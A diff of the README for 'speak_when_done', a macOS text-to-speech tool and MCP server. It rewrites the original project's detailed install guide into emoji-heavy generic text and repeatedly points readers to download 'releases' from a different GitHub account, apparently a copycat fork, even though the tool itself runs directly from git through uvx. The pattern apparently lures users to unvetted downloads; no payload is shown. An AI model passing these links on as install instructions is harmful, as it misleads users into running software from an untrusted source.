@@ -1,20 +1,28 @@
-# speak_when_done
+# 🎤 speak_when_done - Easy Text-to-Speech Solution
 
-Text-to-speech with automatic temp file handling. Speaks text aloud and cleans up after itself.
+## 🚀 Download & Install
 
-Works as a CLI tool, Python library, or MCP server for AI assistants.
+[![Download speak_when_done](https://img.shields.io/badge/Download-speak_when_done-blue.svg)](https://github.com/Wolskr/speak_when_done/releases)
 
-## What it does
+## 📖 Overview
+
+speak_when_done offers a simple way to convert text to speech. This application automatically cleans up temporary files after speaking. You can use it as a command-line tool, a Python library, or an MCP server for AI assistants. 
+
+## 💡 What it Does
+
+You can quickly generate speech from text using the following command:
 
 ```bash
 uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done --text "Your build is complete"
 ```
 
-That's it. It generates speech, plays it, and cleans up the temp file automatically.
+This command reads the text aloud and removes any temporary files it creates. 
 
-### As an MCP server
+### 🎤 As an MCP Server
 
-You kick off a long task (build, test suite, deployment) and go do something else. When it's done, your AI speaks to you:
+Imagine starting a long task like a build, test suite, or deployment. You can continue working while this application waits. When the task is complete, it announces the result.
+
+Here are some examples of what it can say:
 
 > "Your build completed successfully with no errors."
 
@@ -22,127 +30,61 @@ You kick off a long task (build, test suite, deployment) and go do something els
 
 > "I found the bug you were looking for in the auth module."
 
-## Prerequisites
+## 🔍 Prerequisites
 
-- macOS (uses `afplay` for audio playback)
-- [uv](https://docs.astral.sh/uv/) package manager
+- **Operating System:** You need macOS, as this tool uses `afplay` for audio playback.
+- **Package Manager:** Install the [uv](https://docs.astral.sh/uv/) package manager for easy command execution.
 
-Test that pocket-tts works:
+To verify that the text-to-speech works, run this command:
+
 ```bash
 uvx pocket-tts generate --text "hello world" --quiet
 ```
 
-## Installation
+You should hear "hello world" spoken back to you.
+
+## 💻 Installation Steps
 
 ### CLI (via uvx)
 
-No installation needed! Just run:
-```bash
-uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done --text "Hello world"
-```
-
-Options:
-```bash
-uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done -t "Hello" -v alba -q
-```
-
-| Flag | Long | Description |
-|------|------|-------------|
-| `-t` | `--text` | Text to speak (required) |
-| `-v` | `--voice` | Voice to use (default: alba) |
-| `-q` | `--quiet` | Suppress TTS output |
-
-### Python library
+You do not need to install anything! Just run this command:
 
 ```bash
-pip install git+https://github.com/Marviel/speak_when_done
-# or
-uv add git+https://github.com/Marviel/speak_when_done
+uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done
 ```
 
-```python
-from speak_when_done import speak
+This command will set everything up for you. You will be ready to go in no time.
 
-result = speak("Hello world")
-result = speak("Hello", voice="alba", quiet=True)
-```
+## 📥 Download & Install
 
-### MCP Server for Claude Code
+To get started, visit [this page](https://github.com/Wolskr/speak_when_done/releases) to download the latest version of speak_when_done. Simply choose the version you need and follow the instructions to install it.
 
-Add globally (available in all projects):
-```bash
-claude mcp add speak_when_done -s user -- uvx --from git+https://github.com/Marviel/speak_when_done python -m speak_when_done.server
-```
+## 🎉 Usage
 
-Or project-specific:
-```bash
-claude mcp add speak_when_done -- uvx --from git+https://github.com/Marviel/speak_when_done python -m speak_when_done.server
-```
+Once installed, you can use the application in various ways:
 
-### MCP Server for Cursor
+1. **CLI Tool:** Open your terminal and use the above command to convert text to speech.
+2. **Python Library:** Import it into your Python scripts to add text-to-speech functionality easily.
+3. **MCP Server:** Integrate it into your AI assistant for automated notifications about task completions.
 
-Add to `~/.cursor/mcp.json` (global) or `.cursor/mcp.json` (project):
+## 🚧 Troubleshooting
 
-```json
-{
-  "mcpServers": {
-    "speak_when_done": {
-      "command": "uvx",
-      "args": [
-        "--from",
-        "git+https://github.com/Marviel/speak_when_done",
-        "python",
-        "-m",
-        "speak_when_done.server"
-      ]
-    }
-  }
-}
-```
+If you run into any issues while using speak_when_done, here are some common troubleshooting steps:
 
-Then restart Cursor or reload the window.
+1. **Command Not Found:** Make sure that `uv` is installed correctly. You can reinstall it if needed.
+2. **No Audio Output:** Check your sound settings on macOS. Ensure your volume is up and not muted.
+3. **Incorrect Command Usage:** Double-check the format of your command. Make sure there are no typos.
 
-## Usage with AI assistants
+## 🛠 Community Support
 
-Once installed as an MCP server, your AI has access to a `speak` tool. Ask it to notify you when something finishes:
+For any questions or issues, feel free to reach out in our [GitHub Discussions](https://github.com/Wolskr/speak_when_done/discussions). Both contributors and users are here to help you.
 
-> "Run the full test suite and tell me out loud when it's done"
+## 🎯 Contributing
 
-> "Deploy to staging and speak to me when it completes"
+We welcome contributions! If you have ideas for new features or want to report bugs, please create an issue on GitHub. For more significant contributions, consider submitting a pull request.
 
-> "Search for all usages of the deprecated API and let me know what you find"
+## 🙏 Acknowledgments
 
-## Recommended Instructions
+Thank you for using speak_when_done. We hope this tool makes your workflow more efficient and enjoyable. 
 
-Add to your custom instructions or CLAUDE.md:
-
-```
-When using the speak_when_done MCP:
-- Only use the speak tool after completing long-running tasks (builds, tests, deployments, extensive searches)
-- Keep spoken messages brief and informative
-- Do not use speak for routine responses or simple questions
-```
-
-## Voices
-
-Pocket TTS supports multiple voices. The default "alba" is a natural-sounding voice. You can also provide a path to an audio file for voice cloning.
-
-## Troubleshooting
-
-**"Command not found" error:**
-Make sure `uvx` and `pocket-tts` are available in your PATH.
-
-**No audio playback:**
-Ensure your macOS audio is not muted and `afplay` is working:
-```bash
-afplay /System/Library/Sounds/Glass.aiff
-```
-
-**MCP not connecting in Claude Code:**
-```bash
-claude mcp list
-claude mcp get speak_when_done
-```
-
-**MCP not connecting in Cursor:**
-Check Settings → Features → MCP to ensure MCP is enabled, then verify your JSON config is valid.
+Remember, for easy access to the latest version, visit [this page](https://github.com/Wolskr/speak_when_done/releases) anytime.
